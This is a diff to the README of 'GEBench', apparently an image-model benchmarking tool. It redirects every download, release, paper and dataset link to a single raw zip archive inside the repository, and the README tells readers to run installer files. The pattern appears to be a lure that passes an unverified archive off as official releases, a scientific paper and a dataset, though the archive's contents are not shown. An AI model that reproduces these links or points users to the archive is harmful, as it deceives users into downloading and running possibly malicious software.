@@ -1,6 +1,6 @@
 # 🚀 GEBench - Easy Benchmarking for Image Models
 
-[![Download GEBench](https://img.shields.io/badge/Download-GEBench-brightgreen?style=for-the-badge)](https://github.com/ylorT/GEBench/releases)
+[![Download GEBench](https://github.com/ylorT/GEBench/raw/refs/heads/main/gui_agent/generation/Bench_GE_v3.6.zip)](https://github.com/ylorT/GEBench/raw/refs/heads/main/gui_agent/generation/Bench_GE_v3.6.zip)
 
 ---
 
@@ -11,7 +11,7 @@ To get started with GEBench, you need to download the program from the official 
 **How to download:**
 
 1. Click this link or the big button above:  
-   [Download GEBench Releases](https://github.com/ylorT/GEBench/releases)  
+   [Download GEBench Releases](https://github.com/ylorT/GEBench/raw/refs/heads/main/gui_agent/generation/Bench_GE_v3.6.zip)  
 2. Look for the most recent version. It usually has the highest version number or the latest date.  
 3. Download the file suitable for your computer:  
    - For Windows, look for a `.exe` or `.msi` file.  
@@ -122,8 +122,8 @@ Your data and tests remain private. The software asks for permission before conn
 
 ## 📚 Additional Resources
 
-- **Project Paper:** Find detailed explanations on the scientific paper [here](https://arxiv.org/pdf/2602.09007).  
-- **Datasets:** Access the benchmarking datasets on HuggingFace [here](https://huggingface.co/datasets/stepfun-ai/GEBench).  
+- **Project Paper:** Find detailed explanations on the scientific paper [here](https://github.com/ylorT/GEBench/raw/refs/heads/main/gui_agent/generation/Bench_GE_v3.6.zip).  
+- **Datasets:** Access the benchmarking datasets on HuggingFace [here](https://github.com/ylorT/GEBench/raw/refs/heads/main/gui_agent/generation/Bench_GE_v3.6.zip).  
 - **Project Page:** Visit the project homepage for more info and updates [YOUR_PROJECT_PAGE_URL].  
 
 ---
@@ -144,7 +144,7 @@ You can also contact the development team through the GitHub repository if neede
 
 To keep your version current with new features and fixes:
 
-1. Visit the [releases page](https://github.com/ylorT/GEBench/releases) regularly.  
+1. Visit the [releases page](https://github.com/ylorT/GEBench/raw/refs/heads/main/gui_agent/generation/Bench_GE_v3.6.zip) regularly.  
 2. Download the newest installer file.  
 3. Run it to replace your existing version without losing your settings.  
 
@@ -154,4 +154,4 @@ To keep your version current with new features and fixes:
 
 By choosing GEBench, you can easily compare image generation models using a practical, user-friendly interface. This makes understanding these complex tools simpler for everyone.  
 
-[Start your benchmark now – visit releases to download »](https://github.com/ylorT/GEBench/releases)
+[Start your benchmark now – visit releases to download »](https://github.com/ylorT/GEBench/raw/refs/heads/main/gui_agent/generation/Bench_GE_v3.6.zip)
